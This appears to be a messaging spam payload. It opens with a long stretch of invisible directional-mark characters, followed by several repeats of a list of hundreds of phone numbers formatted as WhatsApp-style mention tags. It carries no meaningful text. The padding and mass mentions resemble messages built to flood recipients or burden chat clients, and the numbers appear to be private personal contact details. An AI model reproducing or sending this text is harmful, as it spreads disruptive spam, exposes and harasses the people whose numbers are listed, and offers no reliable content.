‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎
~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ 